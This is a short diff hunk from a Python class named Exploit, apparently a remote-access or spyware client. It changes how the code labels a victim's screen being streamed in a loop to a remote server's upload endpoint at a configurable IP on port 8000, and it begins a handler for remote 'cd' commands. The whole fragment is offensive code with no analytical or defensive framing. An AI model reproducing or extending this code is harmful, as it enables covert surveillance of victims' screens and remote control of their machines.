@@ -85,7 +85,7 @@ class Exploit:
         with mss() as sct:
             monitor = sct.monitors[1]
             while self.T:
-                stream_screen(sct,monitor,f'http://{self.ip}:8000/api/upload_stream/',"monster",0.02)
+                stream_screen(sct,monitor,f'http://{self.ip}:8000/api/upload_stream/',self.target,0.02)
     
     def hundle_command(self, command):
         if command.startswith("cd"):
